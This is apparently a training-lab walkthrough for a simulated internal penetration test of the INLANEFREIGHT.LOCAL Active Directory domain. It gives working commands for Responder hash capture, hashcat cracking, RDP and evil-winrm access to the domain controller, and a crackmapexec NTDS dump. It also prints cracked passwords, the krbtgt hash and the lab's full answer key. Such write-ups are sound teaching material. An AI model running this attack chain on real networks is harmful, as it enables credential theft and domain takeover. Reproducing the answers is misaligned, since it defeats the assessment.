# NOTE — hands-on section (has commands)

## ID
531

## Module
Documentation & Reporting

## Kind
lab

## Title
Skills Assessment — Documentation & Reporting Practice Lab

## Description
Complete an in-progress internal penetration test against INLANEFREIGHT.LOCAL by reviewing inherited notes, capturing a responder hash, cracking it, and achieving Domain Admin via xfreerdp + crackmapexec NTDS dump.

## Tags
active-directory, responder, ntlm, hashcat, crackmapexec, domain-admin

## Commands
- `xfreerdp /v:<TARGET_IP> /u:htb-student /p:HTB_@cademy_stdnt!`
- `sudo responder -I ens224 -wrvf`
- `hashcat -w 3 -O -m 5600 "<NTLMv2_HASH>" /usr/share/wordlists/rockyou.txt`
- `xfreerdp /v:172.16.5.5 /u:backupagent /p:Recovery7`
- `sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds`
- `grep "krbtgt" /root/.cme/logs/<NTDS_LOG_FILE>`
- `grep "svc_reporting" /root/.cme/logs/<NTDS_LOG_FILE>`
- `hashcat -w 3 -O -m 1000 "<NT_HASH>" /usr/share/wordlists/rockyou.txt`
- `evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7`
- `net user svc_reporting`

## What This Section Covers
This lab simulates taking over a mid-engagement internal pentest from a teammate. You inherit Obsidian notes with partial evidence, complete the engagement by capturing and cracking a Responder hash, achieve Domain Admin, dump NTDS, and enumerate local group memberships on the DC.

## Methodology

### Phase 1 — Connect to Testing VM
1. RDP into the Parrot pivot host:
   ```
   xfreerdp /v:<STMIP> /u:htb-student /p:HTB_@cademy_stdnt!
   ```
2. Open **Obsidian** → "Evidence" Vault and review all inherited notes.

### Phase 2 — Harvest Credentials from Obsidian Notes
Review the inherited notes and extract the following credentials and infrastructure:

| Credential | Notes |
|---|---|
| `dhawkins:Bacon1989` | Found in Evidence vault |
| `Administrator:Welcome123!` | Found in Evidence vault |
| `asmith:Welcome1` | Found in Evidence vault |
| `abouldercon:Welcome1` | Found in Evidence vault |

Internal targets:
| Host | IP |
|---|---|
| DC01 | 172.16.5.5 |
| DEV01 | 172.16.5.200 |
| FILE01 | 172.16.5.130 |

The notes also contain partial Responder output under **H3 - LLMNR & NBT-NS Response Spoofing**, indicating a hash was previously captured but not yet cracked.

### Phase 3 — Capture NTLMv2 Hash with Responder
3. From the Parrot host, start Responder on the internal interface:
   ```
   sudo responder -I ens224 -wrvf
   ```
4. Wait for a hit. FILE01 (172.16.5.130) will authenticate, leaking the hash for `INLANEFREIGHT\backupagent`.

### Phase 4 — Crack the NTLMv2 Hash
5. Crack with hashcat mode `5600` (NTLMv2):
   ```
   hashcat -w 3 -O -m 5600 "<FULL_NTLMv2_HASH>" /usr/share/wordlists/rockyou.txt
   ```
   Result: `backupagent:Recovery7`

### Phase 5 — Achieve Domain Admin via RDP
6. RDP directly to the DC with the cracked credentials:
   ```
   xfreerdp /v:172.16.5.5 /u:backupagent /p:Recovery7
   ```
7. Navigate to `C:\Users\Administrator\Desktop\flag.txt` and read the flag.

### Phase 6 — Dump NTDS (Questions 2 & 3)
8. From the Parrot host, dump the full NTDS with crackmapexec:
   ```
   sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds | tee hashes.txt
   ```
9. The NTDS log is saved under `/root/.cme/logs/`. Grep for specific accounts:
   ```
   grep "krbtgt" /root/.cme/logs/<LOG_FILE>.ntds
   grep "svc_reporting" /root/.cme/logs/<LOG_FILE>.ntds
   ```
   Results:
   - `krbtgt` NT hash: `16e26ba33e455a8c338142af8d89ffbc`
   - `svc_reporting` NT hash: `a6d3701ae426329951cf5214b7531140`

10. Crack `svc_reporting` hash offline with mode `1000` (NTLM):
    ```
    hashcat -w 3 -O -m 1000 "a6d3701ae426329951cf5214b7531140" /usr/share/wordlists/rockyou.txt
    ```
    Result: `svc_reporting:Reporter1!`

### Phase 7 — Enumerate Local Group Membership (Question 4)
11. Connect to DC via Evil-WinRM:
    ```
    evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7
    ```
12. Query the user's local group memberships:
    ```
    net user svc_reporting
    ```
    Result: `svc_reporting` is a member of **Backup Operators**.

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Flag on DC01 Administrator Desktop | `d0c_pwN_r3p0rt_reP3at!` | RDP to DC → `C:\Users\Administrator\Desktop\flag.txt` |
| Q2 — NTLM hash of KRBTGT | `16e26ba33e455a8c338142af8d89ffbc` | `crackmapexec --ntds` + grep |
| Q3 — Password of svc_reporting | `Reporter1!` | NTDS dump → hashcat mode 1000 |
| Q4 — Powerful local group of svc_reporting | `Backup Operators` | `net user svc_reporting` via evil-winrm |

## Key Takeaways
- **Always read inherited notes first** — the Obsidian vault contained credentials and partial Responder output that directly led to DA.
- **Responder -wrvf** enables WPAD, relay, verbose, and fingerprinting — use this combo for maximum capture rate on internal networks.
- **backupagent → Domain Admin** worked because the account had DA-level privileges; always verify what you actually have after cracking.
- **Backup Operators** is a notoriously dangerous local group — members can back up the SAM/NTDS even without being DA, enabling full AD compromise via registry backup or VSS.
- **crackmapexec --ntds** combined with grep is the fastest offline workflow for targeted hash extraction after getting DA.
- CME saves NTDS dumps to `/root/.cme/logs/` automatically — always check there before re-running the dump.

## Gotchas
- The `--ntds` flag requires DA or equivalent privileges — if CME returns `ACCESS DENIED`, the account doesn't have enough rights.
- NTLMv2 hashes (mode `5600`) must include the **full hash string** (user::domain:challenge:...) — not just the NT portion.
- Rockyou.txt on Pwnbox/Parrot may be gzipped; run `gunzip /usr/share/wordlists/rockyou.txt.gz` before using it if hashcat complains.
- WriteHat data is **lost on lab reset** — export any findings locally before the VM resets.
